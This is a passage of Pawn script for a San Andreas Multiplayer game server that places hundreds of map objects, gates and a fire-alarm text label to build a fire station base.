	CreateDynamicObject(9339,1706.40,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1718.60,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1718.60,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1712.50,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1712.40,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1714.50,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1714.50,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1716.60,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1716.50,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1763.90,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1763.70,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1746.90,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1746.50,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1729.80,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1729.40,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(1649,1722.10,-1142.50,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1722.40,-1142.30,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1736.90,-1142.30,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1739.90,-1142.40,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1754.00,-1142.30,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1736.80,-1142.30,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1739.60,-1142.50,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1753.80,-1142.50,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1782.90,-1142.32,25.10, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1786.90,-1142.40,25.20, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1783.00,-1142.50,25.20, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1787.10,-1142.50,25.20, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1773.70,-1142.50,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1774.20,-1142.30,25.10, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1705.10,-1094.80,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1714.60,-1094.80,25.20, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1718.60,-1094.77,25.10, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1722.40,-1094.80,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1738.10,-1094.80,25.20, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1755.30,-1094.80,25.20, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1770.90,-1094.80,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1770.90,-1095.00,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1755.30,-1094.71,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1738.20,-1094.90,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1721.70,-1094.90,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1718.40,-1094.81,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1714.60,-1094.89,25.20, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1705.20,-1094.90,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(9339,1757.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1759.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1761.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1763.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1765.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1767.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1770.10,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1757.70,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1759.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1761.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1763.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1765.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1767.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1769.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(1649,1758.00,-1142.50,25.20, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1762.10,-1142.50,25.10, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1765.80,-1142.50,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1769.70,-1142.50,25.10, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1769.70,-1142.32,25.10, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1765.90,-1142.40,25.10, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1762.00,-1142.40,25.20, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1757.90,-1142.40,25.20, 0.00,90.00,180.00);
	CreateDynamicObject(11245,1705.00,-1144.00,31.00, 0.00,0.00,270.00);
	CreateDynamicObject(11245,1721.00,-1144.00,31.00, 0.00,0.00,270.00);
	CreateDynamicObject(11245,1755.20,-1144.00,31.00, 0.00,0.00,270.00);
	CreateDynamicObject(11245,1738.10,-1144.00,31.00, 0.00,0.00,270.00);
	CreateDynamicObject(11245,1772.60,-1144.00,31.00, 0.00,0.00,270.00);
	CreateDynamicObject(1808,1719.30,-1129.20,23.10, 0.00,0.00,0.00);
	CreateDynamicObject(1437,1752.40,-1129.80,23.10, 0.00,0.00,0.00);
	CreateDynamicObject(3881,1750.00,-1103.40,47.40, 0.00,0.00,0.00);
	CreateDynamicObject(9241,1729.10,-1116.60,47.05, 0.00,0.00,90.00);
	CreateDynamicObject(1211,1706.10,-1142.90,23.70, 0.00,0.00,0.00);
	CreateDynamicObject(1211,1753.20,-1142.90,23.70, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1807.57,-1109.40,23.80, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1807.57,-1109.40,25.20, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1807.57,-1109.40,26.60, 0.00,179.99,0.00);
	CreateDynamicObject(9339,1807.57,-1109.40,28.00, 0.00,179.99,0.00);
	CreateDynamicObject(9339,1807.57,-1109.40,29.40, 0.00,179.99,0.00);
	CreateDynamicObject(14782,1715.40,-1129.30,24.10, 0.00,0.00,0.00);
	CreateDynamicObject(14782,1744.90,-1129.30,24.10, 0.00,0.00,0.00);
	CreateDynamicObject(14782,1769.10,-1129.30,24.10, 0.00,0.00,0.00);
	CreateDynamicObject(14782,1710.30,-1108.00,24.10, 0.00,0.00,180.00);
	CreateDynamicObject(14782,1741.70,-1107.90,24.10, 0.00,0.00,179.99);
	CreateDynamicObject(14782,1768.00,-1107.90,24.10, 0.00,0.00,179.99);
	CreateDynamicObject(1893,1761.00,-1101.70,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1767.90,-1101.70,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1751.30,-1101.70,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1741.70,-1101.70,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1731.20,-1101.70,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1719.30,-1101.70,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1708.50,-1101.70,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1707.30,-1135.90,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1746.20,-1135.90,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1721.80,-1135.90,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1736.50,-1135.90,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1760.80,-1135.90,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(1893,1777.40,-1135.90,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(2063,1710.10,-1129.30,24.00, 0.00,0.00,0.00);
	CreateDynamicObject(2063,1707.40,-1129.30,24.00, 0.00,0.00,0.00);
	CreateDynamicObject(2063,1750.10,-1129.30,24.00, 0.00,0.00,0.00);
	CreateDynamicObject(2063,1763.70,-1129.30,24.00, 0.00,0.00,0.00);
	CreateDynamicObject(2063,1717.60,-1108.00,24.00, 0.00,0.00,180.00);
	CreateDynamicObject(2063,1749.30,-1108.00,24.00, 0.00,0.00,179.99);
	CreateDynamicObject(2066,1752.20,-1107.80,23.10, 0.00,0.00,180.00);
	CreateDynamicObject(2066,1752.80,-1107.80,23.10, 0.00,0.00,179.99);
	CreateDynamicObject(2604,1720.51,-1112.88,23.90, 0.00,0.00,90.00);
	CreateDynamicObject(2608,1720.19,-1122.80,23.80, 0.00,0.00,90.00);
	CreateDynamicObject(2610,1720.19,-1124.14,23.90, 0.00,0.00,90.00);
	CreateDynamicObject(2610,1720.17,-1124.63,23.90, 0.00,0.00,90.00);
	CreateDynamicObject(2610,1720.17,-1125.12,23.90, 0.00,0.00,90.00);
	CreateDynamicObject(2009,1720.50,-1121.20,23.10, 0.00,0.00,0.00);
	CreateDynamicObject(1671,1721.30,-1121.10,23.50, 0.00,0.00,314.00);
	CreateDynamicObject(2372,1758.60,-1129.20,23.10, 0.00,0.00,90.00);
	CreateDynamicObject(2394,1758.00,-1129.42,23.77, 0.00,0.00,0.00);
	CreateDynamicObject(2700,1720.25,-1125.10,26.90, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1707.10,-1142.20,24.90, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1713.00,-1142.20,24.90, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1724.30,-1142.20,24.90, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1730.10,-1142.20,24.90, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1741.60,-1142.20,24.89, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1747.20,-1142.10,24.89, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1775.70,-1142.20,24.90, 0.00,0.00,0.00);
	CreateDynamicObject(2922,1712.10,-1095.10,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1729.00,-1095.10,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1735.00,-1095.10,24.90, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1746.10,-1095.10,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1752.10,-1095.10,24.90, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1763.40,-1095.10,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1769.10,-1095.10,24.90, 0.00,0.00,179.99);
	CreateDynamicObject(1569,1720.00,-1116.40,23.10, 0.00,0.00,90.00);
	CreateDynamicObject(1997,1757.40,-1107.60,23.10, 0.00,0.00,90.00);
	CreateDynamicObject(1997,1759.50,-1107.60,23.10, 0.00,0.00,90.00);
	CreateDynamicObject(2961,1737.40,-1106.10,24.70, 0.00,0.00,0.00);
	CreateDynamicObject(1228,1773.80,-1108.70,23.50, 0.00,0.00,0.00);
	CreateDynamicObject(1228,1773.80,-1110.40,23.50, 0.00,0.00,0.00);
	CreateDynamicObject(1228,1773.80,-1112.10,23.50, 0.00,0.00,0.00);
	CreateDynamicObject(1228,1773.80,-1113.80,23.50, 0.00,0.00,0.00);
	CreateDynamicObject(2690,1763.90,-1129.30,25.15, 0.00,0.00,0.00);
	CreateDynamicObject(2690,1764.40,-1129.30,25.15, 0.00,0.00,338.00);
	CreateDynamicObject(2690,1763.20,-1129.20,25.15, 0.00,0.00,0.00);
	CreateDynamicObject(2237,1759.60,-1129.10,24.20, 0.00,0.00,0.00);
	CreateDynamicObject(2237,1759.90,-1129.10,24.20, 0.00,0.00,0.00);
	CreateDynamicObject(2237,1760.20,-1129.10,24.20, 0.00,0.00,0.00);
	CreateDynamicObject(1252,1708.40,-1129.30,24.00, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1707.90,-1129.30,24.00, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1707.40,-1129.30,24.00, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1706.90,-1129.30,24.00, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1708.40,-1129.30,24.40, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1708.00,-1129.30,24.40, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1707.60,-1129.30,24.40, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1707.20,-1129.30,24.40, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1706.80,-1129.30,24.40, 90.00,0.00,0.00);
	CreateDynamicObject(1252,1706.40,-1129.30,24.40, 90.00,0.00,0.00);
	CreateDynamicObject(2690,1708.20,-1129.40,25.15, 0.00,0.00,0.00);
	CreateDynamicObject(2690,1707.80,-1129.40,25.15, 0.00,0.00,0.00);
	CreateDynamicObject(2690,1707.40,-1129.40,25.15, 0.00,0.00,0.00);
	CreateDynamicObject(2690,1707.00,-1129.40,25.15, 0.00,0.00,0.00);
	CreateDynamicObject(2690,1706.60,-1129.40,25.15, 0.00,0.00,0.00);
	CreateDynamicObject(2060,1710.60,-1129.30,23.60, 0.00,0.00,0.00);
	CreateDynamicObject(2060,1709.50,-1129.30,23.60, 0.00,0.00,0.00);
	CreateDynamicObject(2060,1710.60,-1129.30,24.10, 0.00,0.00,0.00);
	CreateDynamicObject(2060,1709.40,-1129.30,24.10, 0.00,0.00,0.00);
	CreateDynamicObject(2228,1737.02,-1127.05,23.60, 0.00,0.00,90.00);
	CreateDynamicObject(2228,1737.02,-1127.40,23.60, 0.00,0.00,90.00);
	CreateDynamicObject(2228,1737.02,-1127.74,23.60, 0.00,0.00,90.00);
	CreateDynamicObject(2228,1736.82,-1125.08,23.96, 90.00,90.00,90.00);
	CreateDynamicObject(638,1721.10,-1143.10,23.80, 0.00,0.00,90.00);
	CreateDynamicObject(638,1704.20,-1142.90,23.80, 0.00,0.00,90.00);
	CreateDynamicObject(638,1738.30,-1143.00,23.80, 0.00,0.00,90.00);
	CreateDynamicObject(638,1755.40,-1143.00,23.80, 0.00,0.00,90.00);
	CreateDynamicObject(638,1772.40,-1143.00,23.80, 0.00,0.00,90.00);
	CreateDynamicObject(2063,1736.82,-1125.03,24.00, 0.00,0.00,270.00);
	CreateDynamicObject(2063,1736.84,-1122.25,24.00, 0.00,0.00,270.00);
	CreateDynamicObject(1010,1736.80,-1125.70,23.50, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.80,-1124.90,23.50, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.80,-1124.10,23.50, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.76,-1123.05,24.00, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.75,-1122.21,24.00, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.74,-1121.39,24.00, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.84,-1122.96,24.80, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.84,-1122.17,24.80, 0.00,0.00,90.00);
	CreateDynamicObject(1010,1736.84,-1121.44,24.80, 0.00,0.00,90.00);
	CreateDynamicObject(1008,1736.73,-1125.67,24.82, 0.00,0.00,310.00);
	CreateDynamicObject(1008,1736.69,-1125.10,24.82, 0.00,0.00,310.00);
	CreateDynamicObject(1008,1736.73,-1124.05,24.82, 0.00,0.00,310.00);
	CreateDynamicObject(1008,1736.73,-1124.59,24.82, 0.00,0.00,310.00);
	CreateDynamicObject(18608,1729.50,-1118.20,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(18608,1780.50,-1117.90,29.00, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1774.80,-1094.90,21.00, 90.00,179.99,90.00);
	CreateDynamicObject(9339,1775.50,-1094.90,19.00, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1787.10,-1094.90,19.00, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1786.90,-1094.90,19.00, 90.00,179.99,90.00);
	CreateDynamicObject(1649,1787.90,-1094.80,25.00, 0.00,90.00,179.99);
	CreateDynamicObject(1649,1773.70,-1094.80,25.00, 0.00,90.00,179.99);
	CreateDynamicObject(1649,1773.80,-1095.00,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1788.20,-1095.00,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(9339,1781.30,-1094.90,19.00, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1781.10,-1094.90,19.00, 90.00,179.99,90.00);
	CreateDynamicObject(1649,1790.70,-1094.80,25.00, 0.00,90.00,179.99);
	CreateDynamicObject(9339,1791.80,-1094.89,19.00, 90.00,179.99,90.00);
	CreateDynamicObject(9339,1792.60,-1094.90,19.00, 90.00,0.00,90.00);
	CreateDynamicObject(1649,1805.50,-1094.80,25.00, 0.00,90.00,179.99);
	CreateDynamicObject(9339,1804.30,-1094.89,19.00, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1798.20,-1094.90,19.00, 90.00,179.99,90.00);
	CreateDynamicObject(9339,1803.90,-1094.89,19.00, 90.00,179.99,90.00);
	CreateDynamicObject(9339,1798.30,-1094.89,19.00, 90.00,0.00,90.00);
	CreateDynamicObject(1649,1791.00,-1095.00,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1805.40,-1095.00,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(2922,1780.80,-1095.10,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1786.70,-1095.10,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1798.00,-1095.10,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(2922,1803.70,-1095.02,24.89, 0.00,0.00,179.99);
	CreateDynamicObject(1656,1776.70,-1123.60,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1778.70,-1123.60,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1778.70,-1122.30,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1778.70,-1121.00,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1778.70,-1119.70,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1778.70,-1118.40,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1776.70,-1122.30,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1776.70,-1121.00,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1776.70,-1119.70,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1776.70,-1118.40,23.30, 0.00,0.00,90.00);
	CreateDynamicObject(1656,1778.70,-1123.59,23.30, 0.00,180.00,90.00);
	CreateDynamicObject(1656,1778.70,-1122.30,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1778.70,-1121.00,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1778.70,-1119.70,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1778.70,-1118.40,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1776.70,-1123.59,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1776.70,-1122.30,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1776.70,-1121.00,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1776.70,-1119.70,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1656,1776.70,-1118.40,23.30, 0.00,179.99,90.00);
	CreateDynamicObject(1294,1780.10,-1124.10,18.70, 0.00,180.00,0.00);
	CreateDynamicObject(1294,1778.10,-1124.10,18.70, 0.00,179.99,0.00);
	CreateDynamicObject(1294,1778.10,-1117.90,18.70, 0.00,179.99,0.00);
	CreateDynamicObject(1294,1780.10,-1117.90,18.70, 0.00,179.99,0.00);
	CreateDynamicObject(1656,1778.70,-1124.90,23.12, 0.00,345.00,90.00);
	CreateDynamicObject(1656,1776.70,-1124.90,23.12, 0.00,345.00,90.00);
	CreateDynamicObject(1656,1776.70,-1117.10,23.12, 0.00,15.00,90.00);
	CreateDynamicObject(1656,1778.70,-1117.10,23.12, 0.00,15.00,90.00);
	CreateDynamicObject(1043,1773.50,-1116.90,24.70, 0.00,0.00,90.00);
	CreateDynamicObject(1043,1773.50,-1116.90,25.50, 0.00,0.00,90.00);
	CreateDynamicObject(1043,1773.50,-1118.70,24.70, 0.00,0.00,90.00);
	CreateDynamicObject(1043,1773.50,-1120.50,24.70, 0.00,0.00,90.00);
	CreateDynamicObject(1043,1773.50,-1118.70,25.50, 0.00,0.00,90.00);
	CreateDynamicObject(1043,1773.50,-1120.50,25.50, 0.00,0.00,90.00);
	CreateDynamicObject(1116,1774.20,-1117.40,25.42, 0.00,0.00,270.00);
	CreateDynamicObject(1159,1773.50,-1116.30,25.00, 0.00,0.00,90.00);
	CreateDynamicObject(1178,1774.10,-1120.51,24.85, 0.00,0.00,80.00);
	CreateDynamicObject(1079,1773.60,-1122.50,23.60, 0.00,0.00,0.00);
	CreateDynamicObject(1079,1773.60,-1123.50,23.60, 0.00,0.00,0.00);
	CreateDynamicObject(1079,1773.60,-1124.50,23.60, 0.00,0.00,0.00);
	CreateDynamicObject(1028,1774.00,-1119.00,26.00, 0.00,0.00,0.00);
	CreateDynamicObject(1013,1773.54,-1123.20,25.10, 0.00,0.00,270.00);
	CreateDynamicObject(14869,1774.00,-1126.10,23.90, 0.00,0.00,180.00);
	CreateDynamicObject(2190,1773.80,-1126.20,23.99, 0.00,0.00,90.00);
	CreateDynamicObject(2190,1773.89,-1125.50,23.99, 0.00,0.00,90.00);
	CreateDynamicObject(2063,1773.80,-1129.60,24.00, 0.00,0.00,90.00);
	CreateDynamicObject(1808,1772.00,-1105.90,23.10, 0.00,0.00,180.00);
	CreateDynamicObject(3465,1790.10,-1121.80,24.40, 0.00,0.00,0.00);
	CreateDynamicObject(3465,1790.00,-1125.00,24.40, 0.00,0.00,0.00);
	CreateDynamicObject(1650,1774.00,-1129.40,24.50, 180.00,90.00,0.00);
	CreateDynamicObject(1650,1774.00,-1129.60,24.50, 179.99,90.00,0.00);
	CreateDynamicObject(1650,1774.00,-1129.80,24.50, 179.99,90.00,0.00);
	CreateDynamicObject(1650,1774.00,-1128.80,24.50, 180.00,90.00,0.00);
	CreateDynamicObject(1650,1773.80,-1129.20,25.10, 0.00,0.00,336.00);
	CreateDynamicObject(1650,1774.00,-1128.60,24.92, 0.00,90.00,15.99);
	CreateDynamicObject(2057,1773.80,-1130.00,24.96, 0.00,0.00,284.00);
	CreateDynamicObject(1008,1773.90,-1130.30,23.98, 0.00,0.00,90.00);
	CreateDynamicObject(1008,1773.90,-1129.30,23.98, 0.00,0.00,90.00);
	CreateDynamicObject(14782,1736.72,-1116.12,24.10, 0.00,0.00,270.00);
	CreateDynamicObject(2063,1736.83,-1108.16,22.80, 0.00,0.00,270.00);
	CreateDynamicObject(2690,1736.81,-1107.52,23.96, 0.00,0.00,270.00);
	CreateDynamicObject(2690,1736.83,-1107.10,23.96, 0.00,0.00,270.00);
	CreateDynamicObject(983,1692.10,-1147.50,22.34, 0.00,0.00,0.00);
	CreateDynamicObject(1215,1692.00,-1069.50,23.50, 0.00,0.00,0.00);
	CreateDynamicObject(1215,1692.10,-1150.90,23.40, 0.00,0.00,0.00);
	CreateDynamicObject(19330,1742.87,-1129.16,25.23, 0.00,270.00,180.00);
	CreateDynamicObject(19331,1742.17,-1129.18,25.23, 0.00,270.00,180.00);
	CreateDynamicObject(19330,1746.68,-1129.19,25.23, 0.00,270.00,180.00);
	CreateDynamicObject(19330,1717.15,-1129.18,25.23, 0.00,270.00,180.00);
	CreateDynamicObject(19330,1710.09,-1108.12,25.23, 0.00,270.00,0.00);
	CreateDynamicObject(9339,1716.23,-1126.72,23.72, 180.00,0.00,90.00);
	CreateDynamicObject(2228,1737.01,-1128.07,23.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1743.83,-1126.72,23.72, 180.00,0.00,90.00);
	CreateDynamicObject(1523,1729.26,-1126.84,23.08, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1732.91,-1126.71,26.30, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1732.91,-1126.71,27.70, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1732.91,-1126.71,29.06, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1716.23,-1110.54,23.72, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1743.83,-1110.54,23.72, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1732.90,-1110.54,26.30, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1733.16,-1110.54,27.70, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1733.16,-1110.54,29.10, 180.00,0.00,90.00);
	CreateDynamicObject(1523,1730.79,-1110.58,23.08, 0.00,0.00,180.00);
	CreateDynamicObject(9339,1731.49,-1110.55,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1728.59,-1110.55,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1731.47,-1126.74,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1728.59,-1126.73,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(1649,1733.37,-1126.72,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1736.23,-1126.72,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1726.33,-1126.72,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1723.40,-1126.73,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1721.06,-1126.73,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1734.32,-1110.57,25.00, 0.00,0.00,0.00);
	CreateDynamicObject(1649,1721.63,-1110.57,25.00, 0.00,0.00,0.00);
	CreateDynamicObject(1649,1735.88,-1110.56,25.00, 0.00,0.00,0.00);
	CreateDynamicObject(1649,1726.61,-1110.57,25.00, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1733.14,-1126.72,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1734.78,-1126.69,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1736.49,-1126.70,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1726.81,-1126.71,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1725.03,-1126.71,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1723.19,-1126.70,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1721.36,-1126.70,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1719.56,-1126.71,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1726.87,-1110.56,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1724.98,-1110.55,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1723.16,-1110.55,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1721.22,-1110.56,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1719.42,-1110.57,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1733.25,-1110.55,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1736.77,-1110.56,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(9339,1735.01,-1110.56,25.12, 90.00,90.00,0.00);
	CreateDynamicObject(2690,1736.81,-1107.97,23.96, 0.00,0.00,270.00);
	CreateDynamicObject(2690,1736.80,-1108.42,23.96, 0.00,0.00,270.00);
	CreateDynamicObject(2690,1736.82,-1108.81,23.96, 0.00,0.00,270.00);
	CreateDynamicObject(2690,1736.81,-1109.22,23.96, 0.00,0.00,270.00);



	CreateDynamic3DTextLabel("Alarm\n/feueralarm",COLOR_GREY,1737.4025,-1106.1199,24.7000,5,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,0);//feueralarm in der feuerwehrbase


	tor[78]=CreateDynamicObject(5422,1715.40,-1142.40,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[79]=CreateDynamicObject(5422,1709.60,-1142.40,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[80]=CreateDynamicObject(5422,1778.10,-1142.40,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[81]=CreateDynamicObject(5422,1726.70,-1142.40,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[82]=CreateDynamicObject(5422,1732.50,-1142.40,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[83]=CreateDynamicObject(5422,1744.00,-1142.40,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[84]=CreateDynamicObject(5422,1749.70,-1142.40,25.10, 0.00,0.00,90.00);//Feuerwehrtor
	tor[85]=CreateDynamicObject(5422,1709.70,-1094.90,25.10, 0.00,0.00,270.00);//Feuerwehrtor
	tor[86]=CreateDynamicObject(5422,1726.60,-1094.90,25.10, 0.00,0.00,270.00);//Feuerwehrtor
	tor[87]=CreateDynamicObject(5422,1732.60,-1094.90,25.10, 0.00,0.00,270.00);//Feuerwehrtor
	tor[88]=CreateDynamicObject(5422,1743.70,-1094.90,25.10, 0.00,0.00,270.00);//Feuerwehrtor
